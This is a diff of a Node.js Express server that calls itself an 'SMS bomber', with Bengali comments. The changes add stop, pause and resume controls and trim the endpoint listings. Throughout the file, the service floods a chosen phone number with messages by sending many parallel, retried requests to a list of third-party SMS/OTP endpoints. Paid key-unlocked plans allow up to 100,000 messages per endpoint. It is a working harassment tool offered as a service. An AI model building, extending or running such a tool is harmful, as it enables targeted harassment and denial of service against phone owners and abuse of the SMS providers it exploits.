@@ -1,18 +1,7 @@
 // ============================================================
-// ULTIMATE POWERFUL SMS BOMBER V5.0 - Render Optimized
+// ULTIMATE POWERFUL SMS BOMBER V5.0 - FIXED
 // Developer: TNEH GROUP
 // ============================================================
-
-// ============================================================
-// IMPORTANT: Check if dependencies are installed
-// ============================================================
-try {
-  require.resolve('express');
-} catch (e) {
-  console.error('❌ Express not found! Please run: npm install');
-  console.error('   Or check your package.json dependencies');
-  process.exit(1);
-}
 
 const express = require('express');
 const axios = require('axios');
@@ -26,8 +15,6 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 console.log(`🚀 Starting SMS Bomber V5.0 on port ${PORT}`);
-console.log(`📁 Current directory: ${__dirname}`);
-console.log(`📦 Node version: ${process.version}`);
 
 // ============================================================
 // মিডলওয়্যার
@@ -46,6 +33,9 @@ app.use(cors({
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 
+// স্ট্যাটিক ফাইল
+app.use(express.static(path.join(__dirname, '../public')));
+
 // ============================================================
 // ডেভেলপার ইনফো
 // ============================================================
@@ -53,7 +43,7 @@ const DEVELOPER_INFO = {
   developer: "TNEH GROUP",
   telegram: "@tneh_owner",
   website: "https://tnehboomber.onrender.com",
-  api_version: "5.0.0-ULTIMATE",
+  api_version: "5.0.0-FIXED",
   build_date: new Date().toISOString()
 };
 
@@ -153,11 +143,11 @@ const CONFIG = {
   maxRetries: 3,
   retryDelay: 200,
   maxCountPerAPI: 100,
-  stopCheckInterval: 50
+  stopCheckInterval: 100 // প্রতি 100ms পর স্টপ চেক
 };
 
 // ============================================================
-// বোম্ব কন্ট্রোলার
+// বোম্ব কন্ট্রোলার - ফিক্সড
 // ============================================================
 class BombController {
   constructor() {
@@ -174,6 +164,7 @@ class BombController {
       totalFailed: 0,
       startTime: Date.now()
     };
+    console.log('✅ BombController initialized');
   }
 
   registerJob(phone, totalCount, options = {}) {
@@ -191,81 +182,144 @@ class BombController {
       options: options,
       progress: 0,
       errors: [],
-      lastUpdate: Date.now()
+      lastUpdate: Date.now(),
+      stopped: false,
+      paused: false
     };
     
     this.activeJobs.set(jobId, job);
     this.jobCounter++;
     this.stats.totalJobs++;
+    console.log(`📝 Job registered: ${jobId}`);
     return jobId;
   }
 
   isJobActive(jobId) {
-    if (this.globalStop) return false;
-    if (this.globalPause) return false;
+    if (this.globalStop) {
+      console.log(`🛑 Global stop is active`);
+      return false;
+    }
+    if (this.globalPause) {
+      console.log(`⏸️ Global pause is active`);
+      return false;
+    }
     const job = this.activeJobs.get(jobId);
-    return job ? job.status === 'active' : false;
+    if (!job) return false;
+    if (job.stopped) return false;
+    if (job.paused) return false;
+    return job.status === 'active';
   }
 
+  // ===== স্টপ ফাংশন =====
   stopJob(jobId) {
+    console.log(`🛑 Stopping job: ${jobId}`);
     const job = this.activeJobs.get(jobId);
     if (job) {
+      job.stopped = true;
       job.status = 'stopped';
       job.endTime = Date.now();
       this.activeJobs.delete(jobId);
       this.completedJobs.set(jobId, job);
+      console.log(`✅ Job stopped: ${jobId}`);
       return true;
     }
+    
+    // পজড জব চেক
+    const pausedJob = this.pausedJobs.get(jobId);
+    if (pausedJob) {
+      pausedJob.stopped = true;
+      pausedJob.status = 'stopped';
+      pausedJob.endTime = Date.now();
+      this.pausedJobs.delete(jobId);
+      this.completedJobs.set(jobId, pausedJob);
+      console.log(`✅ Paused job stopped: ${jobId}`);
+      return true;
+    }
+    
+    console.log(`❌ Job not found: ${jobId}`);
     return false;
   }
 
+  // ===== পজ ফাংশন =====
   pauseJob(jobId) {
+    console.log(`⏸️ Pausing job: ${jobId}`);
     const job = this.activeJobs.get(jobId);
-    if (job && job.status === 'active') {
+    if (job && job.status === 'active' && !job.stopped) {
+      job.paused = true;
       job.status = 'paused';
       this.activeJobs.delete(jobId);
       this.pausedJobs.set(jobId, job);
+      console.log(`✅ Job paused: ${jobId}`);
       return true;
     }
+    console.log(`❌ Cannot pause job: ${jobId}`);
     return false;
   }
 
+  // ===== রিজিউম ফাংশন =====
   resumeJob(jobId) {
+    console.log(`▶️ Resuming job: ${jobId}`);
     const job = this.pausedJobs.get(jobId);
-    if (job) {
+    if (job && !job.stopped) {
+      job.paused = false;
       job.status = 'active';
       this.pausedJobs.delete(jobId);
       this.activeJobs.set(jobId, job);
+      console.log(`✅ Job resumed: ${jobId}`);
       return true;
     }
+    console.log(`❌ Cannot resume job: ${jobId}`);
     return false;
   }
 
+  // ===== সব স্টপ =====
   stopAllJobs() {
-    const jobs = Array.from(this.activeJobs.keys());
-    jobs.forEach(id => this.stopJob(id));
+    console.log(`🛑 Stopping all jobs...`);
     this.globalStop = true;
-    return jobs.length;
+    const jobs = Array.from(this.activeJobs.keys());
+    let count = 0;
+    jobs.forEach(id => {
+      if (this.stopJob(id)) count++;
+    });
+    // পজড জবগুলোও স্টপ
+    const pausedJobs = Array.from(this.pausedJobs.keys());
+    pausedJobs.forEach(id => {
+      if (this.stopJob(id)) count++;
+    });
+    console.log(`✅ Stopped ${count} jobs`);
+    return count;
   }
 
+  // ===== সব পজ =====
   pauseAllJobs() {
+    console.log(`⏸️ Pausing all jobs...`);
     this.globalPause = true;
     const jobs = Array.from(this.activeJobs.keys());
-    jobs.forEach(id => this.pauseJob(id));
-    return jobs.length;
+    let count = 0;
+    jobs.forEach(id => {
+      if (this.pauseJob(id)) count++;
+    });
+    console.log(`✅ Paused ${count} jobs`);
+    return count;
   }
 
+  // ===== সব রিজিউম =====
   resumeAllJobs() {
+    console.log(`▶️ Resuming all jobs...`);
     this.globalPause = false;
     this.globalStop = false;
     const jobs = Array.from(this.pausedJobs.keys());
-    jobs.forEach(id => this.resumeJob(id));
-    return jobs.length;
+    let count = 0;
+    jobs.forEach(id => {
+      if (this.resumeJob(id)) count++;
+    });
+    console.log(`✅ Resumed ${count} jobs`);
+    return count;
   }
 
   updateJobStats(jobId, success, error = null) {
-    const job = this.activeJobs.get(jobId) || this.pausedJobs.get(jobId);
-    if (job) {
+    const job = this.activeJobs.get(jobId);
+    if (job && !job.stopped && !job.paused) {
       job.sentCount++;
       if (success) {
         job.successCount++;
@@ -311,7 +365,9 @@ class BombController {
       startTime: job.startTime,
       endTime: job.endTime || null,
       duration: job.endTime ? ((job.endTime - job.startTime) / 1000).toFixed(2) + 's' : null,
-      errors: job.errors.slice(-5)
+      stopped: job.stopped || false,
+      paused: job.paused || false,
+      errors: job.errors ? job.errors.slice(-5) : []
     };
   }
 
@@ -558,7 +614,18 @@ function replacePhoneNumber(data, phone, count = 1) {
   return data;
 }
 
-async function callSingleAPI(api, phone, attempt = 0) {
+async function callSingleAPI(api, phone, jobId, attempt = 0) {
+  // চেক করুন জব এখনও একটিভ কিনা
+  if (!bombController.isJobActive(jobId)) {
+    return {
+      success: false,
+      api_id: api.id,
+      api_name: api.name,
+      error: 'Job stopped or paused',
+      stopped: true
+    };
+  }
+
   await waitIfNeeded(api.id);
   
   try {
@@ -603,9 +670,9 @@ async function callSingleAPI(api, phone, attempt = 0) {
   } catch (error) {
     updateStats(api.id, false);
     
-    if (attempt < CONFIG.maxRetries) {
+    if (attempt < CONFIG.maxRetries && bombController.isJobActive(jobId)) {
       await Utility.sleep(CONFIG.retryDelay * (attempt + 1));
-      return callSingleAPI(api, phone, attempt + 1);
+      return callSingleAPI(api, phone, jobId, attempt + 1);
     }
     
     return {
@@ -618,16 +685,21 @@ async function callSingleAPI(api, phone, attempt = 0) {
   }
 }
 
+// ============================================================
+// সেন্ড ব্যাচ - স্টপ চেক সহ
+// ============================================================
 async function sendBatch(apis, phone, countPerApi, jobId) {
   const results = [];
   const actualCount = Math.min(countPerApi, CONFIG.maxCountPerAPI);
   const BATCH_SIZE = CONFIG.parallelRequests;
   
   const shuffledAPIs = Utility.shuffleArray([...apis]);
+  let totalSent = 0;
   
   for (let i = 0; i < shuffledAPIs.length; i += BATCH_SIZE) {
+    // স্টপ চেক
     if (!bombController.isJobActive(jobId)) {
-      console.log(`⏹️ Job ${jobId} stopped by user`);
+      console.log(`⏹️ Job ${jobId} stopped by user at batch ${i/BATCH_SIZE}`);
       break;
     }
     
@@ -638,8 +710,9 @@ async function sendBatch(apis, phone, countPerApi, jobId) {
       const promises = [];
       
       for (let j = 0; j < actualCount; j++) {
+        // প্রতি কলের আগে স্টপ চেক
         if (!bombController.isJobActive(jobId)) break;
-        promises.push(callSingleAPI(api, phone));
+        promises.push(callSingleAPI(api, phone, jobId));
       }
       
       const responses = await Promise.all(promises);
@@ -647,7 +720,9 @@ async function sendBatch(apis, phone, countPerApi, jobId) {
       const failCount = responses.filter(r => !r.success).length;
       
       responses.forEach(r => {
-        bombController.updateJobStats(jobId, r.success, r.error);
+        if (!r.stopped) {
+          bombController.updateJobStats(jobId, r.success, r.error);
+        }
       });
       
       return {
@@ -664,6 +739,7 @@ async function sendBatch(apis, phone, countPerApi, jobId) {
     const batchResults = await Promise.all(batchPromises);
     results.push(...batchResults);
     
+    // ব্যাচের মধ্যে ডেলি
     if (i + BATCH_SIZE < shuffledAPIs.length) {
       await Utility.sleep(100);
     }
@@ -676,39 +752,41 @@ async function sendBatch(apis, phone, countPerApi, jobId) {
 // API এন্ডপয়েন্টসমূহ
 // ============================================================
 
-// ===== রুট এন্ডপয়েন্ট =====
+// ===== রুট =====
 app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, '../public/index.html'));
+});
+
+// ===== API ইনফো =====
+app.get('/api', (req, res) => {
   res.json({
     developer: DEVELOPER_INFO,
-    version: "5.0.0-ULTIMATE",
+    version: "5.0.0-FIXED",
     total_apis: SMS_APIS.length,
     plans: Object.keys(PLAN_CONFIG).reduce((acc, key) => {
       acc[key] = {
         max_count: PLAN_CONFIG[key].maxCount,
         requires_key: PLAN_CONFIG[key].requiresKey,
-        description: PLAN_CONFIG[key].description,
-        endpoint: `/api/spam?plan=${key}&number=017XXXXXXXX&count=${PLAN_CONFIG[key].maxCount}`
+        description: PLAN_CONFIG[key].description
       };
       return acc;
     }, {}),
     endpoints: {
-      generate_key: "/api/expiredate=30&createkey",
-      check_key: "/api/checkkey?key=YOUR_KEY",
       spam: "/api/spam?number=017XXXXXXXX&count=300",
-      stop_all: "/api/stop?all=true",
-      pause_all: "/api/pause?all=true",
-      resume_all: "/api/resume?all=true",
+      stop: "/api/stop?jobId=JOB_ID or ?all=true",
+      pause: "/api/pause?jobId=JOB_ID or ?all=true",
+      resume: "/api/resume?jobId=JOB_ID or ?all=true",
       status: "/api/status",
       stats: "/api/stats",
-      health: "/api/health",
-      apis: "/api/apis"
+      health: "/api/health"
     }
   });
 });
 
-// ===== স্প্যাম এন্ডপয়েন্ট =====
+// ============================================================
+// ⭐ স্প্যাম এন্ডপয়েন্ট
+// ============================================================
 app.get('/api/spam', async (req, res) => {
-  const startTime = Date.now();
   const { plan, number, count = 1, key } = req.query;
   
   let currentPlan = 'default';
@@ -725,7 +803,6 @@ app.get('/api/spam', async (req, res) => {
         success: false,
         error: 'Valid API key required for this plan',
         developer: DEVELOPER_INFO,
-        plan: currentPlan,
         generate_key: '/api/expiredate=30&createkey'
       });
     }
@@ -735,8 +812,7 @@ app.get('/api/spam', async (req, res) => {
     return res.status(400).json({
       success: false,
       error: 'Missing number parameter',
-      developer: DEVELOPER_INFO,
-      usage: `/api/spam?number=017XXXXXXXX&count=${planConfig.maxCount}`
+      developer: DEVELOPER_INFO
     });
   }
   
@@ -744,7 +820,7 @@ app.get('/api/spam', async (req, res) => {
   if (!Utility.isValidPhone(cleanNumber)) {
     return res.status(400).json({
       success: false,
-      error: 'Invalid phone number. Use format: 017XXXXXXXX or 88017XXXXXXXX',
+      error: 'Invalid phone number. Use format: 017XXXXXXXX',
       developer: DEVELOPER_INFO
     });
   }
@@ -755,10 +831,7 @@ app.get('/api/spam', async (req, res) => {
     return res.status(400).json({
       success: false,
       error: `Count exceeds ${currentPlan} plan limit (${planConfig.maxCount})`,
-      developer: DEVELOPER_INFO,
-      plan: currentPlan,
-      max_allowed: planConfig.maxCount,
-      requested: perApiCount
+      developer: DEVELOPER_INFO
     });
   }
   
@@ -770,6 +843,7 @@ app.get('/api/spam', async (req, res) => {
   
   console.log(`📱 [${currentPlan.toUpperCase()}] JOB ${jobId}: ${perApiCount}x${SMS_APIS.length} SMS to ${Utility.maskPhone(cleanNumber)}`);
   
+  // অ্যাসিঙ্ক্রোনাস প্রসেসিং
   (async () => {
     try {
       const results = await sendBatch(SMS_APIS, cleanNumber, perApiCount, jobId);
@@ -791,17 +865,22 @@ app.get('/api/spam', async (req, res) => {
     total_apis: SMS_APIS.length,
     total_sms: totalSMS,
     status: 'started',
-    message: 'Bombing started. Use /api/status?jobId=' + jobId + ' to check progress',
+    message: 'Bombing started',
     stop_endpoint: `/api/stop?jobId=${jobId}`,
     status_endpoint: `/api/status?jobId=${jobId}`
   });
 });
 
-// ===== স্টপ এন্ডপয়েন্ট =====
+// ============================================================
+// ⭐ স্টপ এন্ডপয়েন্ট - ফিক্সড
+// ============================================================
 app.get('/api/stop', (req, res) => {
   const { jobId, all } = req.query;
   
-  if (all === 'true' || all === '1') {
+  console.log(`🛑 Stop request received: jobId=${jobId}, all=${all}`);
+  
+  // সব জব স্টপ
+  if (all === 'true' || all === '1' || all === '') {
     const count = bombController.stopAllJobs();
     return res.json({
       success: true,
@@ -812,6 +891,7 @@ app.get('/api/stop', (req, res) => {
     });
   }
   
+  // নির্দিষ্ট জব স্টপ
   if (jobId) {
     const success = bombController.stopJob(jobId);
     if (success) {
@@ -826,22 +906,29 @@ app.get('/api/stop', (req, res) => {
       return res.status(404).json({
         success: false,
         error: `Job ${jobId} not found or already completed`,
-        developer: DEVELOPER_INFO
+        developer: DEVELOPER_INFO,
+        available_jobs: bombController.getAllJobs().map(j => ({ id: j.id, status: j.status }))
       });
     }
   }
   
+  // প্যারামিটার নেই
   return res.status(400).json({
     success: false,
     error: 'Missing jobId or all parameter',
     developer: DEVELOPER_INFO,
-    usage: '/api/stop?jobId=JOB_ID or /api/stop?all=true'
+    usage: '/api/stop?jobId=JOB_ID or /api/stop?all=true',
+    active_jobs: bombController.getAllJobs().map(j => ({ id: j.id, status: j.status }))
   });
 });
 
-// ===== পজ এন্ডপয়েন্ট =====
+// ============================================================
+// ⭐ পজ এন্ডপয়েন্ট - ফিক্সড
+// ============================================================
 app.get('/api/pause', (req, res) => {
   const { jobId, all } = req.query;
+  
+  console.log(`⏸️ Pause request received: jobId=${jobId}, all=${all}`);
   
   if (all === 'true' || all === '1') {
     const count = bombController.pauseAllJobs();
@@ -868,7 +955,7 @@ app.get('/api/pause', (req, res) => {
     } else {
       return res.status(404).json({
         success: false,
-        error: `Job ${jobId} not found or already paused`,
+        error: `Job ${jobId} not found or already paused/completed`,
         developer: DEVELOPER_INFO
       });
     }
@@ -882,9 +969,13 @@ app.get('/api/pause', (req, res) => {
   });
 });
 
-// ===== রিজিউম এন্ডপয়েন্ট =====
+// ============================================================
+// ⭐ রিজিউম এন্ডপয়েন্ট - ফিক্সড
+// ============================================================
 app.get('/api/resume', (req, res) => {
   const { jobId, all } = req.query;
+  
+  console.log(`▶️ Resume request received: jobId=${jobId}, all=${all}`);
   
   if (all === 'true' || all === '1') {
     const count = bombController.resumeAllJobs();
@@ -924,7 +1015,9 @@ app.get('/api/resume', (req, res) => {
   });
 });
 
-// ===== স্ট্যাটাস এন্ডপয়েন্ট =====
+// ============================================================
+// স্ট্যাটাস এন্ডপয়েন্ট
+// ============================================================
 app.get('/api/status', (req, res) => {
   const { jobId } = req.query;
   
@@ -957,7 +1050,9 @@ app.get('/api/status', (req, res) => {
   });
 });
 
-// ===== কী জেনারেট =====
+// ============================================================
+// কী জেনারেট
+// ============================================================
 app.get('/api/expiredate=30&createkey', (req, res) => {
   const apiKey = Utility.generateApiKey();
   const expiryDate = new Date();
@@ -972,13 +1067,13 @@ app.get('/api/expiredate=30&createkey', (req, res) => {
     expiry_date: expiryDate.toISOString(),
     valid_days: 30,
     developer: DEVELOPER_INFO,
-    message: "API key generated successfully",
-    premium_endpoint: `/api/spam?plan=premium&key=${apiKey}&number=017XXXXXXXX&count=10000`,
-    enterprise_endpoint: `/api/spam?plan=enterprise&key=${apiKey}&number=017XXXXXXXX&count=50000`
+    message: "API key generated successfully"
   });
 });
 
-// ===== কী চেক =====
+// ============================================================
+// কী চেক
+// ============================================================
 app.get('/api/checkkey', (req, res) => {
   const { key } = req.query;
   
@@ -1003,7 +1098,9 @@ app.get('/api/checkkey', (req, res) => {
   });
 });
 
-// ===== সব API লিস্ট =====
+// ============================================================
+// সব API লিস্ট
+// ============================================================
 app.get('/api/apis', (req, res) => {
   res.json({
     developer: DEVELOPER_INFO,
@@ -1012,19 +1109,13 @@ app.get('/api/apis', (req, res) => {
       id: api.id,
       name: api.name,
       method: api.method
-    })),
-    plans: Object.keys(PLAN_CONFIG).reduce((acc, key) => {
-      acc[key] = {
-        max_count: PLAN_CONFIG[key].maxCount,
-        requires_key: PLAN_CONFIG[key].requiresKey,
-        description: PLAN_CONFIG[key].description
-      };
-      return acc;
-    }, {})
+    }))
   });
 });
 
-// ===== স্ট্যাটস =====
+// ============================================================
+// স্ট্যাটস
+// ============================================================
 app.get('/api/stats', (req, res) => {
   const stats = bombController.getStats();
   
@@ -1037,57 +1128,41 @@ app.get('/api/stats', (req, res) => {
   });
 });
 
-// ===== হেলথ চেক =====
+// ============================================================
+// হেলথ চেক
+// ============================================================
 app.get('/api/health', (req, res) => {
   const stats = bombController.getStats();
   
   res.json({
     status: 'active',
     developer: DEVELOPER_INFO,
-    version: "5.0.0-ULTIMATE",
+    version: "5.0.0-FIXED",
     timestamp: Utility.getISOString(),
     uptime: stats.uptime,
     total_apis: SMS_APIS.length,
     total_keys: validKeys.size,
     active_jobs: stats.activeJobs,
     paused_jobs: stats.pausedJobs,
-    total_sms_sent: stats.totalSMS,
-    memory: stats.memoryUsage,
-    endpoints: {
-      spam: "/api/spam?number=017XXXXXXXX&count=300",
-      stop: "/api/stop?all=true",
-      pause: "/api/pause?all=true",
-      resume: "/api/resume?all=true",
-      status: "/api/status",
-      stats: "/api/stats"
-    }
+    total_sms_sent: stats.totalSMS
   });
 });
 
-// ===== 404 হ্যান্ডলার =====
+// ============================================================
+// 404 হ্যান্ডলার
+// ============================================================
 app.use((req, res) => {
   res.status(404).json({
     success: false,
     error: 'Endpoint not found',
     developer: DEVELOPER_INFO,
-    path: req.path,
-    available_endpoints: [
-      '/',
-      '/api/spam',
-      '/api/stop',
-      '/api/pause',
-      '/api/resume',
-      '/api/status',
-      '/api/expiredate=30&createkey',
-      '/api/checkkey',
-      '/api/apis',
-      '/api/stats',
-      '/api/health'
-    ]
+    path: req.path
   });
 });
 
-// ===== Error Handler =====
+// ============================================================
+// Error Handler
+// ============================================================
 app.use((err, req, res, next) => {
   console.error('❌ Error:', err.stack);
   res.status(500).json({
@@ -1102,24 +1177,14 @@ app.use((err, req, res, next) => {
 // সার্ভার স্টার্ট
 // ============================================================
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`\n🚀 ULTIMATE SMS BOMBER V5.0 RUNNING`);
+  console.log(`\n🚀 ULTIMATE SMS BOMBER V5.0-FIXED RUNNING`);
   console.log(`🌐 Port: ${PORT}`);
   console.log(`📡 Total APIs: ${SMS_APIS.length}`);
   console.log(`💾 Total Keys: ${validKeys.size}`);
-  console.log(`\n📋 AVAILABLE PLANS:`);
-  console.log(`   🔓 Default: /api/spam?number=017XXXXXXXX&count=300`);
-  console.log(`   🔓 Free: /api/spam?plan=free&number=017XXXXXXXX&count=50`);
-  console.log(`   🔒 Premium: /api/spam?plan=premium&key=KEY&number=017XXXXXXXX&count=10000`);
-  console.log(`   🔒 Enterprise: /api/spam?plan=enterprise&key=KEY&number=017XXXXXXXX&count=50000`);
-  console.log(`   🔒 Unlimited: /api/spam?plan=unlimited&key=KEY&number=017XXXXXXXX&count=100000`);
-  console.log(`\n🛑 CONTROL:`);
-  console.log(`   Stop All: /api/stop?all=true`);
-  console.log(`   Pause All: /api/pause?all=true`);
-  console.log(`   Resume All: /api/resume?all=true`);
-  console.log(`\n📊 STATUS:`);
-  console.log(`   All Jobs: /api/status`);
-  console.log(`   Stats: /api/stats`);
-  console.log(`   Health: /api/health`);
+  console.log(`\n🛑 STOP API: /api/stop?all=true`);
+  console.log(`⏸️ PAUSE API: /api/pause?all=true`);
+  console.log(`▶️ RESUME API: /api/resume?all=true`);
+  console.log(`📊 STATUS: /api/status`);
   console.log(`\n✅ Server ready!\n`);
 });
 
